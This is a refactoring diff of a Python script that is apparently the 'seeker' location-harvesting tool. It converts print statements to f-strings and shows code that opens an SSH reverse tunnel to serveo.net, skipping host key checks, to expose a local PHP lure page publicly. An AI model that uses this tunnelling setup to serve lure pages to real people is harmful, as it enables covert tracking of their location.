@@ -41,10 +41,10 @@ def banner():
 /____  > \___  >\___  >|__|_ \ \___  >|__|
 	 \/      \/     \/      \/     \/        ''' + W)
 	print('\n' + G + '[>]' + C + ' Created By : ' + W + 'thewhiteh4t')
-	print(G + '[>]' + C + ' Version    : ' + W + version + '\n')
+	print(f'{G}[>]{C} Version    : {W}{version}' + '\n')
 
 def ver_check():
-	print(G + '[+]' + C + ' Checking for Updates.....', end='')
+	print(f'{G}[+]{C} Checking for Updates.....', end='')
 	ver_url = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/version.txt'
 	ver_rqst = requests.get(ver_url)
 	ver_sc = ver_rqst.status_code
@@ -53,48 +53,64 @@ def ver_check():
 		github_ver = github_ver.strip()
 
 		if version == github_ver:
-			print(C + '[' + G + ' Up-To-Date ' + C +']' + '\n')
+			print(f'{C}[{G} Up-To-Date {C}]' + '\n')
 		else:
-			print(C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
+			print(f'{C}[{G}' + f' Available : {github_ver} ' + C + ']' + '\n')
 	else:
-		print(C + '[' + R + ' Status : {} '.format(ver_sc) + C + ']' + '\n')
+		print(f'{C}[{R}' + f' Status : {ver_sc} ' + C + ']' + '\n')
 
 def tunnel_select():
 	if tunnel_mode == 'default':
 		serveo()
 	elif tunnel_mode == 'manual':
-		print(G + '[+]' + C + ' Skipping Serveo, start your own tunnel service manually...' + W)
-		print(G + '[+]' + C + ' Append ' + W + '/nearyou/' + C + ' to tunnel URL...' + W)
+		print(
+			f'{G}[+]{C} Skipping Serveo, start your own tunnel service manually...{W}'
+		)
+		print(f'{G}[+]{C} Append {W}/nearyou/{C} to tunnel URL...{W}')
 	else:
-		print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
+		print(
+			f'{R}[+]{C} Invalid Tunnel Mode Selected, Check Help [-h, --help]{W}'
+			+ '\n'
+		)
 		exit()
 
 def serveo():
 	global site, subdom
 	flag = False
 
-	print(G + '[+]' + C + ' Checking Serveo Status...', end='')
+	print(f'{G}[+]{C} Checking Serveo Status...', end='')
 
 	try:
 		time.sleep(1)
 		rqst = requests.get('https://serveo.net', timeout=5)
 		sc = rqst.status_code
 		if sc == 200:
-			print(C + '[' + G + ' UP ' + C + ']' + W + '\n')
+			print(f'{C}[{G} UP {C}]{W}' + '\n')
 		else:
-			print(C + '[' + R + 'Status : {}'.format(sc) + C + ']' + W + '\n')
+			print(f'{C}[{R}' + f'Status : {sc}' + C + ']' + W + '\n')
 			exit()
 	except requests.ConnectionError:
-		print(C + '[' + R + ' DOWN ' + C + ']' + W + '\n')
+		print(f'{C}[{R} DOWN {C}]{W}' + '\n')
 		exit()
-			
-	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
+
+	print(f'{G}[+]{C} Getting Serveo URL...{W}' + '\n')
 	if subdom is None:
 		with open('logs/serveo.txt', 'w') as tmpfile:
 			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:8080', 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
 	else:
 		with open('logs/serveo.txt', 'w') as tmpfile:
-			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '{}.serveo.net:80:localhost:8080'.format(subdom), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
+			proc = subp.Popen(
+				[
+					'ssh',
+					'-oStrictHostKeyChecking=no',
+					'-R',
+					f'{subdom}.serveo.net:80:localhost:8080',
+					'serveo.net',
+				],
+				stdout=tmpfile,
+				stderr=tmpfile,
+				stdin=subp.PIPE,
+			)
 	while True:
 		
 		time.sleep(2)
@@ -106,16 +122,13 @@ def serveo():
 						if 'HTTP' in elem:
 							elem = elem.split(' ')
 							url = elem[4].strip()
-							url = url + '/{}/'.format(site)
-							print(G + '[+]' + C + ' URL : ' + W + url)
+							url = f'{url}/{site}/'
+							print(f'{G}[+]{C} URL : {W}{url}')
 							flag = True
-						else:
-							pass
 				elif flag == True:
 					break
 			except Exception as e:
 				print(e)
-				pass
 
 def server():
 	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
@@ -126,11 +139,11 @@ def server():
 		php_rqst = requests.get('http://127.0.0.1:8080/nearyou/index.html')
 		php_sc = php_rqst.status_code
 		if php_sc == 200:
-			print(C + '[' + G + ' Success ' + C + ']' + W)
+			print(f'{C}[{G} Success {C}]{W}')
 		else:
-			print(C + '[' + R + 'Status : {}'.format(php_sc) + C + ']' + W)
+			print(f'{C}[{R}' + f'Status : {php_sc}' + C + ']' + W)
 	except requests.ConnectionError:
-		print(C + '[' + R + ' Failed ' + C + ']' + W)
+		print(f'{C}[{R} Failed {C}]{W}')
 		Quit()
 
 def wait():
